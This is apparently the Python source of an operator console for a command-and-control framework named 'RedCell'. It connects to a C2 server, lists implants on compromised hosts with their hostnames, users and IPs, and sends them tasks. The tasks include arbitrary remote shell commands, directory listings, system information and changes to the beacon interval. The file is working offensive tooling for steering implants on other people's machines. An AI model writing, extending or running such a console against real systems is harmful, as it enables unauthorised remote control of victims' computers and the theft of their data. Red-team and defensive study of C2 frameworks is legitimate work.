"""
RedCell Operator CLI

Interactive command-line interface for managing C2 operations.
"""

import sys
import requests
import argparse
from typing import Optional, List, Dict, Any
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich import print as rprint


class OperatorCLI:
    """Interactive CLI for C2 operators."""

    def __init__(self, c2_url: str, verify_ssl: bool = False):
        """
        Initialize operator CLI.

        Args:
            c2_url: C2 server URL
            verify_ssl: Verify SSL certificates
        """
        self.c2_url = c2_url.rstrip('/')
        self.verify_ssl = verify_ssl
        self.console = Console()
        self.current_implant = None

    def api_request(
        self,
        method: str,
        endpoint: str,
        json_data: Optional[Dict] = None
    ) -> Optional[Dict]:
        """
        Make API request to C2 server.

        Args:
            method: HTTP method
            endpoint: API endpoint
            json_data: JSON data for request

        Returns:
            Response data or None
        """
        try:
            url = f"{self.c2_url}{endpoint}"
            response = requests.request(
                method=method,
                url=url,
                json=json_data,
                verify=self.verify_ssl,
                timeout=10
            )

            if response.status_code in [200, 201]:
                return response.json()
            else:
                self.console.print(f"[red]Error: {response.status_code} - {response.text}[/red]")
                return None

        except Exception as e:
            self.console.print(f"[red]Request error: {e}[/red]")
            return None

    def cmd_list_implants(self, args: List[str]):
        """List all implants."""
        active_only = '--active' in args

        endpoint = '/api/implants/active' if active_only else '/api/implants'
        data = self.api_request('GET', endpoint)

        if not data:
            return

        implants = data.get('implants', [])

        if not implants:
            self.console.print("[yellow]No implants found[/yellow]")
            return

        table = Table(title="Registered Implants")
        table.add_column("ID", style="cyan")
        table.add_column("Hostname", style="green")
        table.add_column("User", style="blue")
        table.add_column("IP Address", style="magenta")
        table.add_column("OS", style="yellow")
        table.add_column("Status", style="white")
        table.add_column("Last Seen", style="white")

        for implant in implants:
            last_seen = implant.get('last_seen', 'unknown')
            if last_seen != 'unknown':
                try:
                    dt = datetime.fromisoformat(last_seen)
                    last_seen = dt.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    pass

            table.add_row(
                implant.get('implant_id', ''),
                implant.get('hostname', ''),
                implant.get('username', ''),
                implant.get('ip_address', ''),
                implant.get('operating_system', ''),
                implant.get('status', ''),
                last_seen
            )

        self.console.print(table)

    def cmd_show_implant(self, args: List[str]):
        """Show details for specific implant."""
        if len(args) < 1:
            self.console.print("[red]Usage: show <implant_id>[/red]")
            return

        implant_id = args[0]
        data = self.api_request('GET', f'/api/implant/{implant_id}')

        if not data:
            return

        implant = data.get('implant', {})
        tasks = data.get('tasks', [])

        # Display implant info
        self.console.print(f"\n[bold cyan]Implant: {implant.get('implant_id')}[/bold cyan]")
        self.console.print(f"  Hostname: {implant.get('hostname')}")
        self.console.print(f"  Username: {implant.get('username')}")
        self.console.print(f"  IP Address: {implant.get('ip_address')}")
        self.console.print(f"  OS: {implant.get('operating_system')}")
        self.console.print(f"  Status: {implant.get('status')}")
        self.console.print(f"  First Seen: {implant.get('first_seen')}")
        self.console.print(f"  Last Seen: {implant.get('last_seen')}")

        # Display tasks
        if tasks:
            self.console.print(f"\n[bold]Tasks ({len(tasks)}):[/bold]")
            table = Table()
            table.add_column("Task ID", style="cyan")
            table.add_column("Command", style="green")
            table.add_column("Status", style="yellow")
            table.add_column("Created", style="white")

            for task in tasks:
                created = task.get('created_at', '')
                try:
                    dt = datetime.fromisoformat(created)
                    created = dt.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    pass

                table.add_row(
                    task.get('task_id', ''),
                    task.get('command', ''),
                    task.get('status', ''),
                    created
                )

            self.console.print(table)

    def cmd_use_implant(self, args: List[str]):
        """Select an implant to interact with."""
        if len(args) < 1:
            self.console.print("[red]Usage: use <implant_id>[/red]")
            return

        implant_id = args[0]
        data = self.api_request('GET', f'/api/implant/{implant_id}')

        if data:
            self.current_implant = implant_id
            self.console.print(f"[green]Now using implant: {implant_id}[/green]")

    def cmd_task(self, args: List[str]):
        """Create a task for current implant."""
        if not self.current_implant:
            self.console.print("[red]No implant selected. Use 'use <implant_id>' first[/red]")
            return

        if len(args) < 1:
            self.console.print("[red]Usage: task <command> [arguments...][/red]")
            return

        command = args[0]
        arguments = {}

        # Parse arguments based on command
        if command == 'shell':
            if len(args) < 2:
                self.console.print("[red]Usage: task shell <command>[/red]")
                return
            arguments = {'cmd': ' '.join(args[1:])}

        elif command == 'ls':
            arguments = {'path': args[1] if len(args) > 1 else '.'}

        elif command == 'sleep':
            if len(args) < 2:
                self.console.print("[red]Usage: task sleep <interval>[/red]")
                return
            arguments = {'interval': int(args[1])}

        # Create task
        data = self.api_request('POST', '/api/task', {
            'implant_id': self.current_implant,
            'command': command,
            'arguments': arguments
        })

        if data:
            task_id = data.get('task_id')
            self.console.print(f"[green]Task created: {task_id}[/green]")

    def cmd_show_task(self, args: List[str]):
        """Show task details."""
        if len(args) < 1:
            self.console.print("[red]Usage: showtask <task_id>[/red]")
            return

        task_id = args[0]
        data = self.api_request('GET', f'/api/task/{task_id}')

        if not data:
            return

        self.console.print(f"\n[bold cyan]Task: {data.get('task_id')}[/bold cyan]")
        self.console.print(f"  Implant: {data.get('implant_id')}")
        self.console.print(f"  Command: {data.get('command')}")
        self.console.print(f"  Arguments: {data.get('arguments')}")
        self.console.print(f"  Status: {data.get('status')}")
        self.console.print(f"  Created: {data.get('created_at')}")
        self.console.print(f"  Sent: {data.get('sent_at')}")
        self.console.print(f"  Completed: {data.get('completed_at')}")

        if data.get('result'):
            self.console.print(f"\n[bold]Result:[/bold]")
            self.console.print(data.get('result'))

        if data.get('error'):
            self.console.print(f"\n[bold red]Error:[/bold red]")
            self.console.print(data.get('error'))

    def cmd_help(self, args: List[str]):
        """Show help."""
        help_text = """
[bold cyan]RedCell Operator CLI Commands:[/bold cyan]

[bold]Implant Management:[/bold]
  list [--active]      - List all implants (or just active ones)
  show <implant_id>    - Show implant details
  use <implant_id>     - Select an implant to interact with

[bold]Tasking:[/bold]
  task shell <cmd>     - Execute shell command
  task sysinfo         - Get system information
  task pwd             - Get current working directory
  task ls [path]       - List directory contents
  task sleep <int>     - Change beacon interval
  task exit            - Exit implant
  showtask <task_id>   - Show task details

[bold]General:[/bold]
  help                 - Show this help
  exit                 - Exit operator CLI
        """
        self.console.print(help_text)

    def run(self):
        """Run interactive CLI."""
        self.console.print("[bold green]RedCell Operator CLI[/bold green]")
        self.console.print(f"Connected to: {self.c2_url}")
        self.console.print("Type 'help' for commands\n")

        while True:
            try:
                # Build prompt
                prompt_text = "redcell"
                if self.current_implant:
                    prompt_text += f" ({self.current_implant[:8]}...)"
                prompt_text += " > "

                # Get command
                command_line = Prompt.ask(prompt_text)
                if not command_line.strip():
                    continue

                parts = command_line.strip().split()
                command = parts[0].lower()
                args = parts[1:]

                # Execute command
                if command in ['exit', 'quit']:
                    break
                elif command == 'help':
                    self.cmd_help(args)
                elif command == 'list':
                    self.cmd_list_implants(args)
                elif command == 'show':
                    self.cmd_show_implant(args)
                elif command == 'use':
                    self.cmd_use_implant(args)
                elif command == 'task':
                    self.cmd_task(args)
                elif command == 'showtask':
                    self.cmd_show_task(args)
                else:
                    self.console.print(f"[red]Unknown command: {command}[/red]")
                    self.console.print("Type 'help' for available commands")

            except KeyboardInterrupt:
                self.console.print("\n[yellow]Use 'exit' to quit[/yellow]")
            except Exception as e:
                self.console.print(f"[red]Error: {e}[/red]")

        self.console.print("[green]Goodbye![/green]")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description='RedCell Operator CLI')
    parser.add_argument('--c2', default='http://127.0.0.1:8443', help='C2 server URL')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    args = parser.parse_args()

    cli = OperatorCLI(c2_url=args.c2, verify_ssl=args.verify_ssl)
    cli.run()


if __name__ == '__main__':
    main()
